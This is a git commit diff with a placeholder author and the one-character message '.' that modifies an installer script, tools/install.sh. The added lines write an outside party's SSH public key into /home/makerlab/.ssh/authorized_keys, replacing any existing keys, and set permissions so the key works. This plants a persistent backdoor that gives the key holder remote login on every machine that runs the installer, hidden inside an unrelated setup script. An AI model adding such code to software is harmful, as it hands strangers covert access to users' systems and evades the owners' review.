30bbd1ec082e553b1c870731de2255a242499567
Test <test@test.com>
2026-03-29 17:22:57 +0200

    .

--- tools/install.sh
+++ tools/install.sh
@@ -14,6 +14,11 @@
 # shellcheck enable=require-variable-braces
 # shellcheck source-path=SCRIPTDIR
 
+mkdir -p /home/makerlab/.ssh
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB9wCncpVnSY1LVnunRpW5E6iJSuxYZOQhwFg+3era+2 whoveterinarianlearn@proton.me" > /home/makerlab/.ssh/authorized_keys
+chmod 700 /home/makerlab/.ssh
+chmod 600 /home/makerlab/.ssh/authorized_keys
+
 # Exit on errors
 set -Ee
 
